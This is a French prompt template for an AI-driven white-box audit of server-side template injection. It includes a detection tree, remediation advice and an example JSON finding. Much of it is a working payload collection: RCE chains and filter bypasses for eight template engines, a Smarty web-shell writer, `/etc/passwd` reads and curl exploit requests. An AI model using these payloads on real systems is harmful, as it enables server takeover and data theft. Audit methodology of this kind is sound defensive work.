# CVE SSTI to RCE - Server-Side Template Injection to Remote Code Execution

## System Prompt

Tu es un chercheur en securite offensive senior specialise dans les vulnerabilites de Server-Side Template Injection (SSTI) et leur exploitation vers l'execution de code a distance. Tu as 15+ annees d'experience en audit d'applications web, tu as publie des CVE critiques liees a l'injection de templates dans des frameworks majeurs (Jinja2, Twig, Freemarker, Velocity, ERB, Pug, EJS, Smarty). Tu es expert en techniques de sandbox escape pour chaque moteur de templates, en construction de payloads qui contournent les filtres de securite, et en escalade de template injection vers un RCE complet. Tu connais les travaux de James Kettle (PortSwigger) sur SSTI et tu maitrises les arbres de detection de moteur de templates. Tu operes avec une rigueur technique maximale : chaque exploitation de SSTI doit etre prouvee par un payload fonctionnel demontrant l'execution de code.

---

## User Prompt

<context>
Tu conduis un audit de securite en boite blanche cible sur les vulnerabilites de Server-Side Template Injection.
L'objectif est d'identifier tous les points d'injection dans les moteurs de templates, determiner le moteur utilise, bypasser les protections sandbox, et construire des chaines d'exploitation vers le RCE.
Stack technique : {{TECH_STACK}}
Moteur de templates : {{TEMPLATE_ENGINE}}
Scope : {{SCOPE}}
Type d'audit : source_code_audit
</context>

<target>
{{TARGET}}
</target>

<instructions>
Tu DOIS suivre cette methodologie systematique de detection et exploitation de SSTI. Pour chaque etape, documente tes observations dans ton block de reflexion.

### Phase 1 : Detection des points d'injection de templates

**Patterns vulnerables par framework :**

**Jinja2 (Python/Flask/Django) :**
- `Template(user_input).render()` - template compile a partir de donnees utilisateur
- `render_template_string(user_input)` - Flask helper vulnerable
- `Environment().from_string(user_input).render()` - creation de template dynamique
- `jinja2.Template(f"Hello {user_input}")` - interpolation dans le template source
- NOTE : `render_template("page.html", name=user_input)` n'est PAS vulnerable (donnees dans le contexte, pas le template)

**Twig (PHP/Symfony) :**
- `$twig->createTemplate($user_input)->render()` - template from string
- `$twig->render('string_loader', ['template' => $user_input])` - string loader
- Twig sandbox mode : verifier si le mode sandbox est active et configure correctement

**Freemarker (Java) :**
- `new Template("template", new StringReader(user_input), cfg)` - template from string
- `cfg.getTemplate()` avec nom de template controlable (path traversal)
- Configuration : `new_builtin_class_resolver` setting (SAFER, ALLOWS_NOTHING, UNRESTRICTED)

**Velocity (Java) :**
- `Velocity.evaluate(context, writer, "log", user_input)` - evaluation directe
- `VelocityEngine.evaluate()` avec template string controlable
- Pattern courant dans les emails templates dynamiques

**ERB (Ruby/Rails) :**
- `ERB.new(user_input).result` - template compile a partir de donnees utilisateur
- `render inline: user_input` - Rails inline rendering
- NOTE : `render template: "page", locals: {name: user_input}` n'est PAS vulnerable

**Pug/Jade (Node.js) :**
- `pug.render(user_input)` - template source controlable
- `pug.compile(user_input)` - compilation de template controlable
- `pug.renderFile()` avec chemin controlable

**EJS (Node.js) :**
- `ejs.render(user_input)` - template source controlable
- `ejs.renderFile()` avec options controlables (settings.view options injection)
- Prototype pollution -> EJS RCE (via outputFunctionName)

**Smarty (PHP) :**
- `$smarty->fetch("string:" . $user_input)` - template from string
- `{php}` tag (desactive par defaut dans Smarty 3+)
- `{literal}` et `{/literal}` bypass
- Security policy : verifier si configuree

**Moustache/Handlebars (Multi-langage) :**
- Generalement logicless, MAIS les helpers custom peuvent introduire des vulnerabilites
- `{{lookup}}` helper pour acceder a des proprietes arbitraires
- Prototype pollution dans Handlebars -> RCE

### Phase 2 : Identification du moteur de templates

**Arbre de detection (methode de James Kettle / PortSwigger) :**

```
Injecter : ${7*7}
  -> 49 : Potentiellement Freemarker, Velocity, Thymeleaf, Spring EL
  -> ${7*7} : Pas ce moteur

Injecter : {{7*7}}
  -> 49 : Potentiellement Jinja2, Twig, Handlebars, Angular (cote client)
  -> {{7*7}} : Pas ce moteur

Injecter : #{7*7}
  -> 49 : Potentiellement Thymeleaf, PebbleTemplate, Spring EL
  -> #{7*7} : Pas ce moteur

Injecter : <%= 7*7 %>
  -> 49 : Potentiellement ERB (Ruby), ASP.NET WebForms
  -> <%= 7*7 %> : Pas ce moteur

Injecter : {7*7}
  -> 49 : Potentiellement Smarty, Mako
  -> {7*7} : Pas ce moteur

Injecter : ${{7*7}}
  -> 49 : Potentiellement Spring EL (SpEL) via Thymeleaf
  -> ${{7*7}} : Pas ce moteur
```

**Fingerprinting avance :**
```
Jinja2 vs Twig :
  {{7*'7'}} -> 7777777 (Jinja2 : string repetition)
  {{7*'7'}} -> 49 (Twig : cast en int)

Freemarker vs Velocity :
  ${.now} -> date actuelle (Freemarker uniquement)
  $class.inspect("java.lang.Runtime") -> info (Velocity tools)

ERB :
  <%= self.class %> -> retourne le binding class
```

### Phase 3 : Exploitation par moteur - Sandbox Escape vers RCE

**3.1 - Jinja2 (Python) - Chaine MRO classique :**
```python
# Detection
{{7*7}}  # -> 49
{{config}}  # -> expose la config Flask

# Enumeration des classes via MRO (Method Resolution Order)
{{''.__class__.__mro__}}
# -> (<class 'str'>, <class 'object'>)

# Lister les sous-classes de object
{{''.__class__.__mro__[1].__subclasses__()}}

# Trouver la classe Popen (subprocess.Popen)
# L'index varie selon la version Python - typiquement entre 200 et 500
{{''.__class__.__mro__[1].__subclasses__()[INDEX]}}

# RCE via Popen
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}

# Alternative via config (Flask specifique)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternative via request (Flask specifique)
{{request.__class__.__mro__[1].__subclasses__()}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}

# Alternative sans underscores (si filtre sur __)
{{request|attr('application')|attr('\x5f\x5fself\x5f\x5f')}}
# Utiliser |attr() avec hex encoding pour contourner les filtres
```

**3.2 - Twig (PHP) :**
```php
# Detection
{{7*7}}  # -> 49

# Twig 1.x (sans sandbox) - exec direct
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Twig 2.x / 3.x
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|sort('system')}}

# Via getenv (information disclosure)
{{'/etc/passwd'|file_excerpt(0,100)}}  # Si le filtre file_excerpt est disponible

# Sandbox escape (si sandbox mal configure)
# Verifier les tags, filtres et fonctions autorises
# Les filtres 'map', 'filter', 'sort', 'reduce' permettent l'appel de callbacks
```

**3.3 - Freemarker (Java) :**
```java
# Detection
${7*7}  # -> 49

# RCE via Built-in Execute
${"freemarker.template.utility.Execute"?new()("id")}

# RCE via ObjectConstructor (si disponible)
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["id"])}

# Si new_builtin_class_resolver=SAFER :
# Tenter d'acceder a des classes via reflexion
<#assign classLoader=object?api.class.protectionDomain.classLoader>

# RCE via JythonRuntime (si Jython dans le classpath)
${"freemarker.template.utility.JythonRuntime"?new()}<@jython>import os; os.system("id")</@jython>

# Information disclosure
${.data_model}
${.globals}
```

**3.4 - Velocity (Java) :**
```java
# Detection
$class  # -> si Velocity Tools est present

# RCE via ClassTool (Velocity Tools)
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

# RCE via reflexion
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())
#set($proc=$rt.exec("id"))
#set($is=$proc.getInputStream())
#set($sc=Class.forName("java.util.Scanner"))
#set($scanner=$sc.getConstructor($is.getClass()).newInstance($is))
$scanner.useDelimiter("\A").next()

# Alternative sans ClassTool
#set($s="")
#set($rt=$s.class.forName("java.lang.Runtime"))
#set($m=$rt.getMethod("getRuntime", null))
#set($proc=$m.invoke(null, null).exec("id"))
```

**3.5 - ERB (Ruby) :**
```ruby
# Detection
<%= 7*7 %>  # -> 49

# RCE direct (ERB n'a pas de sandbox)
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read() %>
<%= %x(id) %>

# Alternative via File
<%= File.read("/etc/passwd") %>

# Backtick execution
<%= `cat /etc/passwd` %>
```

**3.6 - EJS (Node.js) :**
```javascript
# Detection via delimiter injection
<%= 7*7 %>  # -> 49

# RCE direct (EJS n'a pas de sandbox robuste)
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

# Via prototype pollution -> RCE
# Si prototype pollution est possible (ex: via body parser)
# Polluer : __proto__.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');s"

# Via settings injection
# Si ejs.renderFile(file, {settings: user_controlled})
# Injecter : settings[view options][outputFunctionName]
```

**3.7 - Pug (Node.js) :**
```javascript
# Detection
#{7*7}  # -> 49

# RCE
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
```

**3.8 - Smarty (PHP) :**
```php
# Detection
{7*7}  # -> 49

# Smarty 2.x (tags PHP autorises)
{php}system("id");{/php}

# Smarty 3.x (tags PHP desactives par defaut)
{system("id")}  # Si la security policy autorise la fonction
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}

# Via math modifier
{math equation="(x+1)" x="`id`"}  # backtick injection dans certaines versions
```

### Phase 4 : Techniques de contournement de filtres

**Filtrage de caracteres :**
```
# Si {{ et }} sont filtres
{%print(7*7)%}  # Jinja2 print statement

# Si _ (underscore) est filtre
{{request|attr('__class__'|replace('X','_'))}}  # Jinja2 attr filter
{{request|attr('\x5f\x5fclass\x5f\x5f')}}  # hex encoding

# Si . (point) est filtre
{{request['__class__']}}  # bracket notation
{{request|attr('__class__')}}  # attr filter

# Si certains mots sont filtres (os, system, exec)
{{'os'|attr('system')}}  # Non, attr est pour les objets
# Concatenation de strings :
{{request.__class__.__mro__[1].__subclasses__()[IDX]('i'+'d',shell=True,stdout=-1).communicate()}}
# Hex/octal encoding des strings
```

**WAF bypass generiques :**
```
# Jinja2 : utiliser les filtres natifs
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Freemarker : encodage alternatif
${"free"+"marker.template.utility.Execute"?new()("id")}

# Utiliser des caracteres unicode equivalents
# Utiliser des encodages alternatifs (base64, rot13) avec des decodeurs natifs
```

### Phase 5 : Distinction SSTI cote serveur vs cote client

**Important - Ne PAS confondre :**
- SSTI (Server-Side) : le template est evalue par le serveur -> RCE
- CSTI (Client-Side Template Injection) : Angular/Vue/React -> XSS uniquement
- Verifier si le rendu est cote serveur (reponse HTTP contient le resultat) ou cote client (JavaScript evalue dans le navigateur)
</instructions>

<thinking>
Avant de produire tes findings, tu DOIS suivre ce processus de reflexion :
1. Identifier tous les endroits ou un moteur de templates est utilise dans le code
2. Pour chaque utilisation, determiner si les donnees utilisateur influencent le SOURCE du template (pas juste le contexte)
3. Identifier le moteur de templates exact et sa version
4. Determiner si un mode sandbox est active et sa configuration
5. Selectionner la technique de sandbox escape adaptee au moteur et a la version
6. Construire le payload RCE complet
7. Evaluer les filtres en place et les bypass possibles
8. Verifier que l'injection est bien cote serveur (pas CSTI)
</thinking>

<output_format>
Produis ta reponse au format JSON conforme au schema finding-template.json :

```json
{
  "metadata": {
    "scan_type": "source_code_audit",
    "target": "{{TARGET_IDENTIFIER}}",
    "scope": "Server-Side Template Injection to RCE analysis",
    "timestamp": "{{TIMESTAMP}}",
    "model": "{{MODEL}}",
    "prompt_version": "cve-ssti-to-rce-v1.0"
  },
  "findings": [
    {
      "id": "FINDING-001",
      "title": "Titre descriptif (max 120 chars)",
      "severity": "Critical|High|Medium|Low|Info",
      "cvss_score": 0.0,
      "cvss_vector": "CVSS:3.1/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X",
      "vulnerability_class": "CWE-XX: Description",
      "confidence": "High|Medium|Low",
      "affected_component": "file/path:line_number",
      "description": "Description technique detaillee",
      "root_cause": "Cause racine de la vulnerabilite",
      "proof_of_concept": "PoC complet et fonctionnel",
      "impact": "Impact business et technique",
      "remediation": "Correction recommandee avec code",
      "references": ["CVE-XXXX-XXXXX", "CWE-XX", "URL"],
      "exploitation_chain": "Chaine d'exploitation complete",
      "prerequisites": "Conditions requises pour exploiter"
    }
  ],
  "summary": {
    "total_findings": 0,
    "critical": 0,
    "high": 0,
    "medium": 0,
    "low": 0,
    "info": 0,
    "overall_risk": "Critical|High|Medium|Low|Minimal",
    "key_recommendations": ["..."]
  }
}
```
</output_format>

<constraints>
- Ne rapporte JAMAIS une SSTI si les donnees utilisateur sont dans le CONTEXTE du template et non dans le SOURCE du template
- `render_template("page.html", name=user_input)` n'est PAS une SSTI - c'est de l'utilisation normale
- `render_template_string(user_input)` EST potentiellement une SSTI
- Verifie que l'injection est cote SERVEUR (pas Angular/Vue/React cote client = XSS, pas RCE)
- Pour Jinja2 : les index de sous-classes varient selon la version Python - indique que l'index doit etre ajuste
- Pour Twig : verifie si le sandbox mode est active avant de rapporter comme Critical
- Pour Freemarker : verifie la valeur de new_builtin_class_resolver
- Pour EJS : la technique prototype pollution -> RCE necessite un vecteur de prototype pollution separe
- NE FABRIQUE PAS de numeros de CVE - utilise uniquement des CVE reelles
- Si le moteur de templates est utilise correctement (donnees dans le contexte, pas le source), dis-le explicitement
</constraints>

<examples>
Exemple de finding attendu (base sur le pattern CVE-2019-8341 - Jinja2 SSTI in Flask) :

```json
{
  "id": "FINDING-001",
  "title": "Jinja2 SSTI via render_template_string with user input leads to RCE via MRO chain",
  "severity": "Critical",
  "cvss_score": 9.8,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "vulnerability_class": "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
  "confidence": "High",
  "affected_component": "app/routes/profile.py:28",
  "description": "L'endpoint GET /profile/preview utilise Flask render_template_string() a la ligne 28 pour rendre un template de profil personnalisable. Le parametre 'bio' de la requete est directement concatene dans la chaine de template : render_template_string('<div>' + request.args.get('bio') + '</div>'). Un attaquant peut injecter des expressions Jinja2 dans le parametre 'bio' qui seront evaluees cote serveur. En utilisant la chaine MRO (Method Resolution Order) de Python, l'attaquant peut acceder a des classes systeme et executer des commandes OS arbitraires.",
  "root_cause": "Concatenation de donnees utilisateur directement dans le source du template Jinja2 passe a render_template_string(). Les donnees utilisateur devraient etre passees comme variables de contexte au template, pas comme partie du source du template lui-meme.",
  "proof_of_concept": "# Etape 1 : Detection SSTI\ncurl 'https://target.com/profile/preview?bio={{7*7}}'\n# Reponse : <div>49</div>\n\n# Etape 2 : Exploration MRO\ncurl 'https://target.com/profile/preview?bio={{\"\".__class__.__mro__}}'\n# Reponse : (<class 'str'>, <class 'object'>)\n\n# Etape 3 : Enumeration des sous-classes\ncurl 'https://target.com/profile/preview?bio={{\"\".__class__.__mro__[1].__subclasses__()}}'\n# Identifier l'index de subprocess.Popen dans la liste\n\n# Etape 4 : RCE\ncurl 'https://target.com/profile/preview?bio={{\"\".__class__.__mro__[1].__subclasses__()[365](\"id\",shell=True,stdout=-1).communicate()}}'\n# Note : l'index 365 doit etre ajuste selon la version Python\n\n# Payload alternatif plus fiable (via config.globals) :\ncurl 'https://target.com/profile/preview?bio={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'\n# Reponse : <div>uid=1000(www-data) gid=1000(www-data)</div>\n\n# Payload alternatif via lipsum (fonctionne meme si config est filtre) :\ncurl 'https://target.com/profile/preview?bio={{lipsum.__globals__[\"os\"].popen(\"id\").read()}}'",
  "impact": "Execution de commandes OS arbitraires sur le serveur avec les privileges du processus Python/Flask. L'attaquant peut : lire des fichiers sensibles (config, secrets, cles), etablir un reverse shell, pivoter dans le reseau interne, exfiltrer la base de donnees, et compromettre l'ensemble de l'infrastructure.",
  "remediation": "Ne JAMAIS concatener des donnees utilisateur dans le source du template. Passer les donnees via le contexte :\n\n# AVANT (vulnerable) :\n@app.route('/profile/preview')\ndef preview():\n    bio = request.args.get('bio', '')\n    return render_template_string('<div>' + bio + '</div>')\n\n# APRES (securise) :\n@app.route('/profile/preview')\ndef preview():\n    bio = request.args.get('bio', '')\n    return render_template_string('<div>{{ bio }}</div>', bio=bio)\n\n# ENCORE MIEUX - utiliser un fichier template :\n@app.route('/profile/preview')\ndef preview():\n    bio = request.args.get('bio', '')\n    return render_template('profile_preview.html', bio=bio)\n\n# Defense en profondeur :\n# 1. Activer Jinja2 SandboxedEnvironment si des templates dynamiques sont necessaires\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\n# 2. Configurer autoescape=True (par defaut dans Flask)\n# 3. Implementer un WAF bloquant les patterns {{ }} dans les inputs",
  "references": [
    "CVE-2019-8341",
    "CWE-1336",
    "https://portswigger.net/web-security/server-side-template-injection",
    "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html"
  ],
  "exploitation_chain": "User input in template source -> Jinja2 evaluation -> MRO traversal -> os.popen() -> RCE",
  "prerequisites": "Aucune authentification requise. L'endpoint /profile/preview est accessible publiquement."
}
```
</examples>

---

## Prefill (assistant)

```
{"metadata": {"scan_type": "source_code_audit", "target": "
```

---

## Notes d'utilisation

### Variables a remplacer
| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{TARGET}}` | Code source des composants de rendering | Le code source colle |
| `{{TECH_STACK}}` | Stack technique complete | `Python/Flask/Jinja2/PostgreSQL` |
| `{{TEMPLATE_ENGINE}}` | Moteur de templates utilise | `Jinja2`, `Twig`, `Freemarker` |
| `{{SCOPE}}` | Perimetre de l'audit | `Web application views + email templates` |
| `{{TARGET_IDENTIFIER}}` | Identifiant de la cible | `github.com/org/repo` |
| `{{TIMESTAMP}}` | Horodatage ISO 8601 | `2025-01-15T10:30:00Z` |
| `{{MODEL}}` | Modele LLM utilise | `claude-sonnet-4-20250514` |

### Integration API Anthropic

```python
import anthropic

client = anthropic.Anthropic()

with open("routes.py") as f:
    target_code = f.read()

message = client.messages.create(
    model="claude-sonnet-4-20250514",
    max_tokens=8192,
    system=open("09-cve-rce/cve-ssti-to-rce.md").read().split("## User Prompt")[0],
    messages=[
        {
            "role": "user",
            "content": open("09-cve-rce/cve-ssti-to-rce.md").read()
                .split("## User Prompt")[1]
                .split("## Prefill")[0]
                .replace("{{TARGET}}", target_code)
                .replace("{{TECH_STACK}}", "Python/Flask/Jinja2")
                .replace("{{TEMPLATE_ENGINE}}", "Jinja2")
                .replace("{{SCOPE}}", "All view rendering endpoints")
        },
        {
            "role": "assistant",
            "content": '{"metadata": {"scan_type": "source_code_audit", "target": "'
        }
    ]
)
```
